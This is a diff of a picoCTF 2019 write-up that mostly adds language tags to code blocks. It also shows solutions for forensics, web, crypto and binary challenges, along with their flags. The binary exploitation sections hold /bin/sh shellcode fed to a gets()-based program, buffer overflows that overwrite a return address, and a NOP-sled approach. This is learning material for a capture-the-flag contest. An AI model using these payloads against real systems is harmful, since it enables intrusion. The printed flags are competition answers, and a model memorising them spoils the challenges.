@@ -50,7 +50,7 @@ I based the table format above on [this](https://github.com/shiltemann/CTF-write
 Gynvael gave up on this. Maybe it was too easy.
 
 ## Glory of the Garden - Forensics
-```
+```console
 $ file garden.jpg # This is to confirm that this file is actually a jpg
 garden.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 2999x2249, frames 3
 $ ls -la garden.jpg # Check size
@@ -58,7 +58,7 @@ $ ls -la garden.jpg # Check size
 $ strings garden.jpg | grep pico # Look for the string “pico” in the file
 Here is a flag "picoCTF{more_than_m33ts_the_3y3b7FBD20b}"
 ```
-Grep to win (used in super easy challenges or badly prepared challenges
+Grep to win (used in super easy challenges or badly prepared challenges)
 
 ## Insp3ct0r - Web Exploitation
 Just use “view page source”
@@ -74,7 +74,7 @@ or just `man ascii`
 
 ## The Numbers - Cryptography 
 There are only numbers no larger than 26 so the numbers just stand for the index of each letter in the alphabet. Manually do it or use this script from Gynvael:
-```
+```python
 import string
 a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 k = [16, 9, 3, 15, 3, 20, 6, 20, 8, 5, 14, 21, 13, 2, 5, 18, 19, 13, 1, 19, 15, 14]
@@ -115,7 +115,7 @@ Powers of 2: 8421
 ```
 ## handy-shellcode - Binary Exploitation 
 Connect to the shell server
-```
+```console
 $ ls -la  /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9
 total 732
 drwxr-xr-x   2 root       root                4096 Sep 28  2019 .
@@ -125,20 +125,20 @@ drwxr-x--x 684 root       root               69632 Oct 10  2019 ..
 -rw-rw-r--   1 hacksports hacksports           624 Sep 28  2019 vuln.c
 ```
 The gets() function is the vulnerable part of the code. This means we can use any character except '\n' or 0x0A
-```
- void vuln(char *buf){
+```c
+void vuln(char *buf){
  	gets(buf);
   puts(buf);
 }
 ```
 
 In main(), this line runs the input
-```
+```c
 ((void (*)())buf)();
 ```
 
 If we just run the program and put in random input like asdf, the program will crash since asdf aren't valid instruction that can be executed
-```
+```console
 $ ./vuln
 Enter your shellcode:
 asdf
@@ -150,14 +150,14 @@ As we can see, the program just segfaults.
 
 
 However, if we use 0xC3 as the input, the program will run without crashing since 0xC3 is the 'ret' assembly instruction, so when we run the program with it as input, the program should exit without crashing.
-```
+```console
 $ echo -e '\xC3' | ./vuln 
 ```
 
 This confirms our assumptions of how the program runs. According to Gynvael, exploitation is a process where "everything can go wrong," so it's good to work with small steps to make sure our assumptions are correct.
 
 Find out what architecture the shellcode should be:
-```
+```console
 $ file vuln
 vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=7b65fbf1fba331b6b09a6812a338dbb1118e68e9, not stripped
 ```
@@ -170,14 +170,14 @@ We find some shellcode for spawning a shell [here](http://shell-storm.org/shellc
 ```
 
 Let's give vuln the shellcode as input
-```
+```console
 $ echo -e '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80` | ./vuln
 Enter your shellcode:
 1Ph//shh/binPS
 Thanks! Executing now...
 ```
 The shellcode above doesn't seem to work, but it actually does. The program just exits after successfully running the shellcode and spawning a shell. In order to interact with the shell, we need to keep stdin open.
-```
+```console
 $ (echo -e '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`; cat) | ./vuln
 Enter your shellcode:
 1Ph//shh/binPS
@@ -191,7 +191,7 @@ Gynvael saves his shellcode to a file and then uses `cat shellcode - | ./vuln` i
 
 ## practice-run-1 - Binary Exploitation 
 Login to the shell server and just run the binary
-```
+```console
 $ cd /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e
 $ ls -la
 total 84
@@ -203,7 +203,7 @@ picoCTF{g3t_r3adY_2_r3v3r53}
 ```
 
 ## unzip - Forensics 
-```
+```console
 $ file flag.zip
 flag.zip: Zip archive data, at least v2.0 to extract
 $ strings flag.zip | grep pico # Grep2win doesn't work
@@ -248,19 +248,19 @@ Use the table
 
 ## First Grep - General Skills 
 Grep to win
-```
+```console
 $ cat file | grep pico
 picoCTF{grep_is_good_to_find_things_ad4e9645}
 ```
 
 ## OverFlow 0 - Binary Exploitation 
 This line of code means the  sigsegv_handler() function is called when the program crashes.
-```
+```c
 signal(SIGSEGV, sigsegv_handler);
 ```
 
 We just have to crash the program to get the flag read to us:
-```
+```c
 void sigsegv_handler(int sig) {
   fprintf(stderr, "%s\n", flag); // This prints our flag
   fflush(stderr);
@@ -269,7 +269,7 @@ void sigsegv_handler(int sig) {
 ```
 
 To crash the program, just overflow the buffer by sending in more than buffer length
-```
+```console
 $ ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 picoCTF{3asY_P3a5y1fcf81f9}
 ```
@@ -281,35 +281,33 @@ Just go to the link and scroll down
 Caesar cipher is basically rot-n where n is a number. Use an online decoder like [http://theblob.org/rot.cgi]. 
 
 ## dont-use-client-side - Web Exploitation 
-```
-<script type="text/javascript">
-  function verify() {
-    checkpass = document.getElementById("pass").value;
-    split = 4;
-    if (checkpass.substring(0, split) == 'pico') {
-      if (checkpass.substring(split*6, split*7) == 'b956') {
-        if (checkpass.substring(split, split*2) == 'CTF{') {
-         if (checkpass.substring(split*4, split*5) == 'ts_p') {
-          if (checkpass.substring(split*3, split*4) == 'lien') {
-            if (checkpass.substring(split*5, split*6) == 'lz_e') {
-              if (checkpass.substring(split*2, split*3) == 'no_c') {
-                if (checkpass.substring(split*7, split*8) == 'b}') {
-                  alert("Password Verified")
-                  }
+```javascript
+function verify() {
+  checkpass = document.getElementById("pass").value;
+  split = 4;
+  if (checkpass.substring(0, split) == 'pico') {
+    if (checkpass.substring(split*6, split*7) == 'b956') {
+      if (checkpass.substring(split, split*2) == 'CTF{') {
+       if (checkpass.substring(split*4, split*5) == 'ts_p') {
+        if (checkpass.substring(split*3, split*4) == 'lien') {
+          if (checkpass.substring(split*5, split*6) == 'lz_e') {
+            if (checkpass.substring(split*2, split*3) == 'no_c') {
+              if (checkpass.substring(split*7, split*8) == 'b}') {
+                alert("Password Verified")
                 }
               }
-      
             }
+    
           }
         }
       }
     }
-    else {
-      alert("Incorrect password");
-    }
-    
   }
-</script>
+  else {
+    alert("Incorrect password");
+  }
+  
+}
 ```
 Just sort the substrings in order and then add them all to form the completed flag.
 
@@ -318,14 +316,14 @@ Set the admin cookie to True
 
 ## strings it - General Skills 
 Another grep to win
-```
+```console
 $ strings strings | grep pico
 picoCTF{5tRIng5_1T_c611cac7}
 ```
 
 ## vault-door-1 - Reverse Engineering 
 Just sort the charAt() by indexes and combine the characters into the completed string.
-```
+```java
 password.charAt(0)  == 'd'
 password.charAt(29) == '7'
 password.charAt(4)  == 'r'
@@ -361,7 +359,7 @@ password.charAt(31) == '0'
 ```
 
 ## what's a net cat - General Skills 
-```
+```console
 $ nc -v 2019shell1.picoctf.com 37851
 Connection to 2019shell1.picoctf.com 37851 port [tcp/*] succeeded!
 You're on your way to becoming the net cat master
@@ -377,13 +375,13 @@ The robots.txt is a "sign" to tell web crawlers and search engines like Google n
 
 ## OverFlow 1 - Binary Exploitation
  Check what type of binary this is
-```
+```console
 $ file vuln
 vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=5d4cdc8dc51fb3e5d45c2a59c6a9cd7958382fc9, not stripped
 ```
 
 The vulnerable part of the code is the  `gets(buf);` in the vuln() function:
-```
+```c
 void vuln(){
   char buf[BUFFSIZE];
   gets(buf);
@@ -393,7 +391,7 @@ void vuln(){
 ```
 
 The source code already has a flag() function helpfully placed in the program to read the flag out to us:
-```
+```c
 void flag() {
   char buf[FLAGSIZE];
   FILE *f = fopen("flag.txt","r");
@@ -410,7 +408,7 @@ void flag() {
 We just have to overwrite the return address with the address of flag.
 
 Get the address of flag
-```
+```console
 $ objdump -d ./vuln | grep flag
 080485e6 <flag>:
  8048618:       75 1c                   jne    8048636 <flag+0x50>
@@ -419,7 +417,7 @@ The address of the flag() function is 0x80485e6
 
 Intel x86 uses little endian so use e6 85 04 08  when overwriting the ret address
 
-```
+```console
 $ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\xe6\x85\x04\x08' | ./vuln
 Give me a string and lets see what happens:
 Woah, were jumping to 0x80485e6 !
@@ -429,20 +427,20 @@ We use more than 64 bytes because there's some padding and other stuff we have t
 
 ## So Meta - Forensics 
 Grep to win
-```
+```console
 $ strings  pico_img.png | grep pico
 picoCTF{s0_m3ta_43f253bb}
 ```
 
 or use exiftool to look at metadata
-```
+```console
 $ exiftool pico_img.png | grep pico
 File Name                       : pico_img.png
 Artist                          : picoCTF{s0_m3ta_43f253bb}
 ```
 
 ## What Lies Within - Forensics
-```
+```console
 $ strings buildings.png | grep pico # Always grep to win
 $ file buildings.png
 buildings.png: PNG image data, 657 x 438, 8-bit/color RGBA, non-interlaced
@@ -477,7 +475,7 @@ Data is hidden using the least significant bit. E.g. for a color 0x31708f, the f
 Use an online [decoder](https://stylesuxx.github.io/steganography/). If you've never implemented LSB steg, then that's another thing you should implement according to Gynvael.
 
 ## Extensions - Forensics
-```
+```console
 $ strings flag.txt | grep pico # Grep to win
 $ file flag.txt
 flag.txt: PNG image data, 1697 x 608, 8-bit/color RGB, non-interlaced
@@ -516,7 +514,7 @@ b'table'
 
 ## Client-side-again - Web Exploitation 
 Look at the verify() function in the javascript
-```
+```javascript
 function verify() {
     checkpass = document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];
     split = 0x4;
@@ -542,7 +540,7 @@ function verify() {
 }
 ```
 Isolate only the if cases
-```
+```js
 if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3'))
 if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n')
 if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4'))
@@ -554,7 +552,7 @@ if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7'))
 ```
 
 Replace split with 0x4 since we know split = 0x4
-```
+```js
 if (checkpass[_0x4b5b('0x2')](0x0, 0x4 * 0x2) == _0x4b5b('0x3'))
 if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n')
 if (checkpass[_0x4b5b('0x2')](0x4 * 0x2, 0x4 * 0x2 * 0x2) == _0x4b5b('0x4'))
@@ -566,7 +564,7 @@ if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7'))
 ```
 
 Do math and simplify
-```
+```js
 if (checkpass[_0x4b5b('0x2')](0, 8) == _0x4b5b('0x3'))
 if (checkpass[_0x4b5b('0x2')](7, 9) == '{n')
 if (checkpass[_0x4b5b('0x2')](8, 16) == _0x4b5b('0x4'))
@@ -578,7 +576,7 @@ if (checkpass[_0x4b5b('0x2')](12, 16) == _0x4b5b('0x7'))
 ```
 
 We can use the javascript console to figure out that _0x4b5b('0x2') is just substring so all the checkpass[_0x4b5b('0x2')] can be replaced with checkpass['substring']
-```
+```js
 if (checkpass['substring'](0, 8) == _0x4b5b('0x3'))
 if (checkpass['substring'](7, 9) == '{n')
 if (checkpass['substring'](8, 16) == _0x4b5b('0x4'))
@@ -590,7 +588,7 @@ if (checkpass['substring'](12, 16) == _0x4b5b('0x7'))
 ```
 
 Remove redundant checks
-```
+```js
 if (checkpass['substring'](0, 8) == _0x4b5b('0x3'))
 if (checkpass['substring'](8, 16) == _0x4b5b('0x4'))
 if (checkpass['substring'](24, 32) == _0x4b5b('0x5'))
@@ -598,7 +596,7 @@ if (checkpass['substring'](16, 24) == _0x4b5b('0x6'))
 ```
 
 Use the javascript console to figure out what _0x4b5b('0x3') and so on are.
-```
+```js
 if (checkpass['substring'](0, 8) == "picoCTF{")
 if (checkpass['substring'](8, 16) == "not_this")
 if (checkpass['substring'](24, 32) == "9d025}")
@@ -609,7 +607,7 @@ Piece the flag together using above:
 picoCTF{not_this_again_39d025}
 
 ## First Grep: Part II - General Skills 
-```
+```console
 $ rgrep pico
 files1/file22:picoCTF{grep_r_to_find_this_af11356f}
 ```
@@ -636,8 +634,8 @@ In the javascript console
 Just use a morse code [decoder](http://www.unit-conversion.info/texttools/morse-code/).
 
 All uppercase
-```python
-python
+```pycon
+$ python
 >>> "picoctf{m0rs3c0d31sfun1818224575}".upper()
 PICOCTF{M0RS3C0D31SFUN1818224575}
 ```
@@ -650,7 +648,7 @@ Change the user agent to picobrowser
 Use Chrome DevTools and create a new emulated device with user agent string "picobrowser"
 
 or use curl
-```
+```console
 $ curl -A picobrowser https://2019shell1.picoctf.com/problem/12255/flag | grep "pico"
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -660,7 +658,7 @@ $ curl -A picobrowser https://2019shell1.picoctf.com/problem/12255/flag | grep "
 ```
 
 ## plumbing - General Skills
-```
+```console
 $ nc -v 2019shell1.picoctf.com 21957 | grep pico
 Connection to 2019shell1.picoctf.com 21957 port [tcp/*] succeeded!
 picoCTF{digital_plumb3r_c1082838}
@@ -670,7 +668,7 @@ picoCTF{digital_plumb3r_c1082838}
 You must know [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) for this task, but "it's really simple."
 
 Connect to the quiz using netcat:
-```
+```console
 $ nc -v 2019shell1.picoctf.com 61751
 Connection to 2019shell1.picoctf.com 61751 port [tcp/*] succeeded!
 Good morning class! It's me Ms. Adleman-Shamir-Rivest
@@ -858,7 +856,7 @@ Some attacks: If e is too small
 
 ## slippery-shellcode - Binary Exploitation
 Check for
-```
+```console
 $ checksec --file ./vuln
 [*] '/problems/slippery-shellcode_4_64839254839978b32eb661ca92071d48/vuln'
     Arch:     i386-32-little
@@ -872,7 +870,7 @@ $ checksec --file ./vuln
 `No PIE` means ASLR (Address Space Layout Randomization) is basically disabled, so the starting address is constant.
 
 Vulnerable code:
-```
+```c
 void vuln(char *buf){
   gets(buf);
   puts(buf);
@@ -887,7 +885,7 @@ We need a nopsled since the code randomizes where we run the buffer.
 We can use a nopsled to fill the buffer so that it doesn't really matter where in the nopsled the cpu starts executing from. 
 
 For our shellcode, we can use c library functions, since the binary is statically linked:
-```
+```console
 $ file vuln
 vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=df86b06c60f9f6b307f6d381d8498245c4d3691c, not stripped
 ```
@@ -934,13 +932,13 @@ n1:
  
 ```
 Save above shellcode as a file like asdf.asm and then compile
-```
+```console
 $ nasm asdf.asm
 ```
 This produces a binary called asdf
 
 To pass the shellcode as input to the program:
-```
+```console
 $ cat ~/asdf | ./vuln
 
 Enter your shellcode:
